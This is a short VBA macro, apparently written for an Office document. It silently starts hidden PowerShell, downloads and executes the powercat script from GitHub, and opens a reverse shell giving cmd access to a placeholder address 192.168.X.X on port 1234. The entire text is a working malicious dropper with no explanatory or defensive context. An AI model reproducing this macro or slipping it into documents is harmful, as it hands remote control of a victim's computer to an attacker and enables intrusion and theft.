Sub Macro1()
'
' Macro1 Macro
'

Dim program As String
Dim args As String

program = "powershell -windowstyle hidden -command"
args = "IEX(New-Object -type System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.X.X -p 1234 -e cmd"

Call Shell(program & " " & Chr(34) & args & Chr(34))
'
End Sub
